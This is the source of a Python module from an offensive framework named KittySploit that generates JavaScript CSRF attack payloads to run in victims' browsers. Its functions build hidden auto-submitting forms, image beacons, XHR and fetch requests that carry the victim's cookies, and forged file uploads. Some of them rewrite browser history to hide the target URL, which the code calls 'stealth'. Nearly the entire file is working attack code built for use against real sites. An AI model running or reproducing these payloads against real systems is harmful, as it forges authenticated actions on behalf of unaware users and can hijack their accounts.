#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
CSRF Utility Module for KittySploit
Provides CSRF attack generation methods compatible with browser_server
"""

from core.framework.base_module import BaseModule
from core.framework.option import OptString
from core.output_handler import print_info, print_error
import json
import re
import random
import string


class Csrf(BaseModule):
    """
    CSRF utility class for generating CSRF attack payloads
    Compatible with browser_server for executing attacks in victim browsers
    """
    
    url = OptString("http://127.0.0.1", "URL to perform CSRF", required=True)
    path = OptString("/", "Path to perform CSRF", required=True)
        
    def csrf_get(self, url: str) -> str:
        """
        Generate JavaScript code to perform a CSRF GET request
        
        Pour une CSRF GET, la faille est dans l'URL elle-même.
        On utilise une méthode simple et discrète (image ou iframe).
        
        Args:
            url: Full URL with query parameters (e.g., "http://target.com/path?param=value")
            
        Returns:
            JavaScript code string that can be executed via browser_server
        """
        # Escape the URL for JavaScript
        escaped_url = json.dumps(url)
        
        # Générer le code JavaScript qui retourne une confirmation
        # Le browser_server capture le résultat de l'évaluation
        js_code = f"(function() {{ new Image().src = {escaped_url}; return 'CSRF GET request sent to ' + {escaped_url}; }})();"
        
        return js_code
    
    def csrf_post(self, form_data: list) -> str:
        """
        Generate JavaScript code to create a form for CSRF POST request
        
        Args:
            form_data: List of HTML form lines (e.g., ['<form method="POST" action="...">', '<input name="..." value="...">', '</form>'])
            
        Returns:
            JavaScript code string that creates the form (use csrf_submit() to submit it)
        """
        # Join form data and escape for JavaScript
        form_html = '\n'.join(form_data)
        escaped_html = json.dumps(form_html)
        
        js_code = f"""
        (function() {{
            try {{
                // Create a temporary container
                var container = document.createElement('div');
                container.style.display = 'none';
                container.innerHTML = {escaped_html};
                
                // Append to body
                document.body.appendChild(container);
                
                console.log('[CSRF] Form created successfully');
                return 'CSRF form created successfully';
            }} catch (error) {{
                console.error('[CSRF] Error creating form:', error);
                return 'CSRF form creation failed: ' + error.message;
            }}
        }})();
        """
        
        return js_code.strip()
    
    def csrf_post_and_submit(self, form_data: list, form_name: str = None) -> str:
        """
        Generate JavaScript code to create and submit a CSRF POST form in one operation
        
        Args:
            form_data: List of HTML form lines (e.g., ['<form method="POST" action="...">', '<input name="..." value="...">', '</form>'])
            form_name: Name attribute of the form to submit (if None, generates a random unique name)
            
        Returns:
            JavaScript code string that creates and submits the form
        """
        # Generate random form name if not provided to avoid conflicts
        if form_name is None:
            form_name = 'csrf_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        
        # Replace form name in form_data if it contains name="..." or name='...'
        # This ensures the form has the correct name attribute
        processed_form_data = []
        for line in form_data:
            # Replace existing name attribute if present
            if 'name=' in line and '<form' in line:
                # Replace name="..." or name='...' with our generated name
                line = re.sub(r'name=["\']([^"\']+)["\']', f'name="{form_name}"', line)
                # If no name attribute exists, add it
                if 'name=' not in line:
                    line = line.replace('<form', f'<form name="{form_name}"', 1)
            processed_form_data.append(line)
        
        # Join form data and escape for JavaScript
        form_html = '\n'.join(processed_form_data)
        escaped_html = json.dumps(form_html)
        escaped_name = json.dumps(form_name)
        
        js_code = f"""
        (function() {{
            try {{
                // Create a temporary container
                var container = document.createElement('div');
                container.style.display = 'none';
                container.innerHTML = {escaped_html};
                
                // Append to body
                document.body.appendChild(container);
                
                // Find form by name
                var form = document.forms[{escaped_name}];
                if (!form) {{
                    form = document.querySelector('form[name=' + {escaped_name} + ']');
                }}
                
                if (!form) {{
                    throw new Error('Form with name ' + {escaped_name} + ' not found');
                }}
                
                // Modify history to hide the action URL (optional stealth)
                if (window.history && window.history.pushState) {{
                    history.pushState('', '', '/');
                }}
                
                // Submit the form
                form.submit();
                
                console.log('[CSRF] Form created and submitted:', {escaped_name});
                return 'CSRF POST form created and submitted successfully';
            }} catch (error) {{
                console.error('[CSRF] Error:', error);
                return 'CSRF POST attack failed: ' + error.message;
            }}
        }})();
        """
        
        return js_code.strip()
    
    def csrf_submit(self, form_name: str) -> str:
        """
        Generate JavaScript code to submit a form by name
        
        Args:
            form_name: Name attribute of the form to submit
            
        Returns:
            JavaScript code string that submits the form
        """
        escaped_name = json.dumps(form_name)
        
        js_code = f"""
        (function() {{
            try {{
                // Find form by name
                var form = document.forms[{escaped_name}];
                if (!form) {{
                    // Try to find by querySelector
                    form = document.querySelector('form[name=' + {escaped_name} + ']');
                }}
                
                if (!form) {{
                    throw new Error('Form with name ' + {escaped_name} + ' not found');
                }}
                
                // Modify history to hide the action URL (optional stealth)
                if (window.history && window.history.pushState) {{
                    history.pushState('', '', '/');
                }}
                
                // Submit the form
                form.submit();
                
                console.log('[CSRF] Form submitted:', {escaped_name});
                return 'CSRF form submitted successfully';
            }} catch (error) {{
                console.error('[CSRF] Error submitting form:', error);
                return 'CSRF form submission failed: ' + error.message;
            }}
        }})();
        """
        
        return js_code.strip()
    
    def csrf_post_simple(self, url: str, params: dict) -> str:
        """
        Generate JavaScript code to perform a CSRF POST request with parameters
        
        Args:
            url: Target URL
            params: Dictionary of form parameters (e.g., {'username': 'admin', 'password': 'hacked'})
            
        Returns:
            JavaScript code string that creates and submits a POST form
        """
        escaped_url = json.dumps(url)
        escaped_params = json.dumps(params)
        
        js_code = f"""
        (function() {{
            try {{
                // Create form
                var form = document.createElement('form');
                form.method = 'POST';
                form.action = {escaped_url};
                form.style.display = 'none';
                
                // Add parameters as hidden inputs
                var params = {escaped_params};
                for (var key in params) {{
                    if (params.hasOwnProperty(key)) {{
                        var input = document.createElement('input');
                        input.type = 'hidden';
                        input.name = key;
                        input.value = params[key];
                        form.appendChild(input);
                    }}
                }}
                
                // Append form to body
                document.body.appendChild(form);
                
                // Modify history to hide the action URL (optional stealth)
                if (window.history && window.history.pushState) {{
            history.pushState('', '', '/');
                }}
                
                // Submit the form
                form.submit();
                
                console.log('[CSRF] POST request sent to:', {escaped_url});
                return 'CSRF POST request sent successfully';
            }} catch (error) {{
                console.error('[CSRF] Error:', error);
                return 'CSRF POST request failed: ' + error.message;
            }}
        }})();
        """
        
        return js_code.strip()
    
    def csrf_xhr(self, url: str, method: str = "POST", params: dict = None, headers: dict = None) -> str:
        """
        Generate JavaScript code to perform CSRF using XMLHttpRequest
        
        Args:
            url: Target URL
            method: HTTP method (GET, POST, PUT, DELETE, etc.)
            params: Dictionary of parameters (for POST/PUT)
            headers: Dictionary of custom headers
            
        Returns:
            JavaScript code string that performs XHR request
        """
        escaped_url = json.dumps(url)
        escaped_method = json.dumps(method.upper())
        escaped_params = json.dumps(params or {})
        escaped_headers = json.dumps(headers or {})
        
        js_code = f"""
        (function() {{
            try {{
                var xhr = new XMLHttpRequest();
                var method = {escaped_method};
                var url = {escaped_url};
                var params = {escaped_params};
                var headers = {escaped_headers};
                
                xhr.open(method, url, true);
                
                // Set headers
                if (method === 'POST' || method === 'PUT') {{
                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                }}
                
                for (var headerName in headers) {{
                    if (headers.hasOwnProperty(headerName)) {{
                        xhr.setRequestHeader(headerName, headers[headerName]);
                    }}
                }}
                
                // Build request body
                var body = '';
                if (method === 'POST' || method === 'PUT') {{
                    var paramPairs = [];
                    for (var key in params) {{
                        if (params.hasOwnProperty(key)) {{
                            paramPairs.push(encodeURIComponent(key) + '=' + encodeURIComponent(params[key]));
                        }}
                    }}
                    body = paramPairs.join('&');
                }}
                
                xhr.onload = function() {{
                    console.log('[CSRF] XHR request completed. Status:', xhr.status);
                }};
                
                xhr.onerror = function() {{
                    console.error('[CSRF] XHR request failed');
                }};
                
                xhr.send(body);
                
                console.log('[CSRF] XHR request sent:', method, url);
                return 'CSRF XHR request sent successfully';
            }} catch (error) {{
                console.error('[CSRF] Error:', error);
                return 'CSRF XHR request failed: ' + error.message;
            }}
        }})();
        """
        
        return js_code.strip()
    
    def csrf_fetch(self, url: str, method: str = "POST", params: dict = None, headers: dict = None) -> str:
        """
        Generate JavaScript code to perform CSRF using Fetch API
        
        Args:
            url: Target URL
            method: HTTP method (GET, POST, PUT, DELETE, etc.)
            params: Dictionary of parameters (for POST/PUT)
            headers: Dictionary of custom headers
            
        Returns:
            JavaScript code string that performs fetch request
        """
        escaped_url = json.dumps(url)
        escaped_method = json.dumps(method.upper())
        escaped_params = json.dumps(params or {})
        escaped_headers = json.dumps(headers or {})
        
        js_code = f"""
        (function() {{
            try {{
                var method = {escaped_method};
                var url = {escaped_url};
                var params = {escaped_params};
                var headers = {escaped_headers};
                
                // Build request options
                var options = {{
                    method: method,
                    mode: 'no-cors',  // Bypass CORS restrictions
                    credentials: 'include',  // Include cookies
                    headers: headers
                }};
                
                // Add body for POST/PUT
                if (method === 'POST' || method === 'PUT') {{
                    var formData = new FormData();
                    for (var key in params) {{
                        if (params.hasOwnProperty(key)) {{
                            formData.append(key, params[key]);
                        }}
                    }}
                    options.body = formData;
                }}
                
                fetch(url, options)
                    .then(function(response) {{
                        console.log('[CSRF] Fetch request completed. Status:', response.status);
                        return 'CSRF fetch request sent successfully';
                    }})
                    .catch(function(error) {{
                        console.error('[CSRF] Fetch request failed:', error);
                        return 'CSRF fetch request failed: ' + error.message;
                    }});
                
                console.log('[CSRF] Fetch request sent:', method, url);
                return 'CSRF fetch request initiated';
            }} catch (error) {{
                console.error('[CSRF] Error:', error);
                return 'CSRF fetch request failed: ' + error.message;
            }}
        }})();
    """

        return js_code.strip()
    
    def csrf_file_upload(self, url: str, file_content: str, file_name: str, file_field_name: str = "file", additional_params: dict = None) -> str:
        """
        Generate JavaScript code to perform a CSRF file upload using FormData
        
        Note: Due to browser security restrictions, we create a Blob from the file content
        and upload it via FormData. This works for CSRF attacks.
        
        Args:
            url: Target URL for file upload
            file_content: Content of the file to upload (as string)
            file_name: Name of the file to upload
            file_field_name: Name of the file field in the form (default: "file")
            additional_params: Dictionary of additional form parameters
            
        Returns:
            JavaScript code string that performs file upload
        """
        escaped_url = json.dumps(url)
        escaped_file_content = json.dumps(file_content)
        escaped_file_name = json.dumps(file_name)
        escaped_field_name = json.dumps(file_field_name)
        escaped_params = json.dumps(additional_params or {})
        
        js_code = f"""
        (function() {{
            try {{
                var url = {escaped_url};
                var fileContent = {escaped_file_content};
                var fileName = {escaped_file_name};
                var fieldName = {escaped_field_name};
                var additionalParams = {escaped_params};
                
                // Create a Blob from the file content
                var blob = new Blob([fileContent], {{ type: 'application/octet-stream' }});
                var file = new File([blob], fileName, {{ type: 'application/octet-stream' }});
                
                // Create FormData
                var formData = new FormData();
                formData.append(fieldName, file);
                
                // Add additional parameters
                for (var key in additionalParams) {{
                    if (additionalParams.hasOwnProperty(key)) {{
                        formData.append(key, additionalParams[key]);
                    }}
                }}
                
                // Send via fetch (works for CSRF)
                fetch(url, {{
                    method: 'POST',
                    credentials: 'include',  // Include cookies for authenticated requests
                    body: formData
                }})
                .then(function(response) {{
                    console.log('[CSRF] File upload completed. Status:', response.status);
                    return 'CSRF file upload sent successfully (Status: ' + response.status + ')';
                }})
                .catch(function(error) {{
                    console.error('[CSRF] File upload failed:', error);
                    return 'CSRF file upload failed: ' + error.message;
                }});
                
                console.log('[CSRF] File upload initiated:', fileName, 'to', url);
                return 'CSRF file upload initiated';
            }} catch (error) {{
                console.error('[CSRF] Error:', error);
                return 'CSRF file upload failed: ' + error.message;
            }}
        }})();
        """
        
        return js_code.strip()
        